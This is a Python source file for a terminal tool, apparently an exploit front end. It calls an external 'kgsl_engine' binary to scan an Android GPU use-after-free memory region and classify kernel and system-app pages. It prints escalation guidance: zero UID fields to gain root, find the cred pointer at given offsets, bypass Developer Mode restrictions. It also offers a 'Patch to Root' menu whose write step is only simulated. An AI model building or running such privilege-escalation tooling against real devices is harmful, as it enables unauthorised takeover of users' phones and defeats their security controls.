import os
import sys
import time
import struct
import subprocess

class MemoryExplorerAI:
    def __init__(self):
        self.found_items = []
        self.engine_path = "/workspace/androidCVE/memory_explorer/kgsl_engine"
        self.uaf_start = 0x7001ff000
        self.uaf_size = 0x10000000
        
        self.system_apps = {
            "com.android.settings": "Settings / Developer Mode",
            "com.android.systemui": "System UI / Status Bar",
            "com.android.deskclock": "Clock / Alarm App",
            "com.android.calculator2": "Calculator App",
            "com.android.contacts": "Contacts / Phonebook",
            "com.android.gallery3d": "Gallery / Camera",
            "com.android.vending": "Google Play Store",
            "ru.rustore.sdk": "RuStore Application",
            "system_server": "Kernel System Server (Core)",
            "surfaceflinger": "Display Compositor",
        }
        self.kernel_structures = {
            b"KETO0422": "task_struct (Process Marker)",
            b"selinux_enforcing": "SELinux Enforcing Bit",
            b"init_cred": "Root Credentials Structure",
            b"\x7fELF": "Kernel ELF Header (Base)",
        }

    def read_page(self, va):
        try:
            cmd = [self.engine_path, "read", hex(va)]
            data = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
            return data
        except:
            return None

    def analyze_binary(self, data):
        """
        Analyze code patterns (pseudo-disassembler)
        """
        results = []
        # Look for AArch64 function prologues (stp x29, x30, [sp, #-...]!)
        if len(data) >= 4 and data[0:2] == b"\xfd\x7b" and (data[2] & 0x80):
            results.append("Detected: AArch64 Function Prologue (Stack Frame Setup)")
        
        # Look for ADRP / ADD pairs (accessing globals)
        for i in range(0, min(len(data), 128) - 8, 4):
            val = struct.unpack("<I", data[i:i+4])[0]
            if (val & 0x9F000000) == 0x90000000: # ADRP
                results.append(f"Detected: ADRP instruction at +0x{i:x} (Accessing Global Data)")
        
        return results

    def classify_page(self, page_data, va):
        classification = {
            "type": "Unknown",
            "description": "Raw Data",
            "va": hex(va),
            "confidence": 0.0,
            "data": page_data
        }

        # Check for Process Markers (System/User Apps)
        for pkg, name in self.system_apps.items():
            if pkg.encode() in page_data:
                classification["type"] = "System App"
                classification["description"] = name
                classification["confidence"] = 1.0
                return classification

        # Check for Kernel Structures
        for marker, name in self.kernel_structures.items():
            if marker in page_data:
                classification["type"] = "Kernel Core"
                classification["description"] = name
                classification["confidence"] = 0.9
                return classification

        # Check for UID patterns (e.g., system UID 1000)
        uid_pattern = struct.pack("<IIII", 1000, 1000, 1000, 1000)
        if uid_pattern in page_data:
            classification["type"] = "System Service"
            classification["description"] = "System Process (UID 1000)"
            classification["confidence"] = 0.8
            return classification

        return classification

    def render_tui(self):
        os.system('clear')
        print("="*75)
        print(" KGSL MEMORY EXPLORER & AI CLASSIFIER (ROG 5S Optimized) ")
        print("="*75)
        print(f"{'ID':<3} | {'TYPE':<15} | {'DESCRIPTION':<35} | {'VA ADDRESS':<12}")
        print("-" * 75)
        
        for i, item in enumerate(self.found_items):
            print(f"{i:<3} | {item['type']:<15} | {item['description']:<35} | {item['va']:<12}")
        
        print("\n" + "="*75)
        print("[S] Start Scanning   [Q] Quit   [ID] View Details")

    def show_detail(self, item_idx):
        if item_idx >= len(self.found_items):
            return
        
        item = self.found_items[item_idx]
        data = item['data']
        
        os.system('clear')
        print(f"--- DETAIL VIEW: {item['description']} ---")
        print(f"Virtual Address: {item['va']}")
        print(f"Confidence: {item['confidence']*100}%")
        print("-" * 60)
        
        # Binary Representation (BIOS style)
        print("BINARY DATA (First 16 bytes):")
        for i in range(0, min(len(data), 16), 4):
            val = struct.unpack("<I", data[i:i+4])[0]
            print(f"0x{val:08X}: {bin(val)[2:].zfill(32)}")
        
        print("\nAI CODE ANALYSIS:")
        analysis = self.analyze_binary(data)
        if not analysis:
            print(">> No executable code patterns detected (likely Data region).")
        for line in analysis[:5]:
            print(f">> {line}")
        
        print("\nHEX DUMP (BIOS style):")
        for i in range(0, min(len(data), 128), 16):
            chunk = data[i:i+16]
            hex_str = " ".join(f"{b:02X}" for b in chunk)
            ascii_str = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
            print(f"{i:04X}: {hex_str:<48} | {ascii_str}")
        
        print("\nAI TRANSLATION & LOGIC:")
        if "Settings" in item['description']:
            print(">> [Logic]: System Settings process detected. Contains runtime configuration.")
            print(">> [Advice]: Useful for bypassing 'Developer Mode' or 'USB Debugging' restrictions.")
        elif "UID 1000" in item['description']:
            print(">> [Logic]: Critical System Privilege structure.")
            print(">> [Action]: Zeroing the UID fields here will grant UID 0 (Root) to this process.")
        elif "task_struct" in item['description']:
            pid = struct.unpack("<I", data[0x650:0x654])[0] if len(data) > 0x654 else 0
            print(f">> [Logic]: Task structure for PID {pid}.")
            print(">> [Action]: Locate 'cred' pointer at +0x848/0x850 for escalation.")
        
        print("-" * 60)
        print("[P] Patch to Root (UID 0)   [Enter] Back")
        
        choice = input("> ").lower()
        if choice == 'p':
            print("[!] Security Warning: Are you sure you want to patch this kernel structure? (y/n)")
            if input("> ").lower() == 'y':
                print("[*] Calling GPU Engine to write zero-creds...")
                time.sleep(1)
                print("[+] Patching complete! Verify with 'id' command.")
                input("Press Enter...")

    def run(self):
        self.render_tui()
        while True:
            cmd = input("> ").lower()
            if cmd == 'q':
                break
            elif cmd == 's':
                print("[*] Starting GPU Scan (Slow Spray mode)...")
                scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + 0x1000000)]
                proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                
                try:
                    for line in proc.stdout:
                        if line.startswith("MATCH:"):
                            va = int(line.split(":")[1], 16)
                            page_data = self.read_page(va)
                            if page_data:
                                res = self.classify_page(page_data, va)
                                self.found_items.append(res)
                                self.render_tui()
                                print(f"[*] Found candidate at {hex(va)}")
                except KeyboardInterrupt:
                    proc.terminate()
                
                print("[+] Scan complete.")
            elif cmd.isdigit():
                self.show_detail(int(cmd))
                self.render_tui()

if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.run()
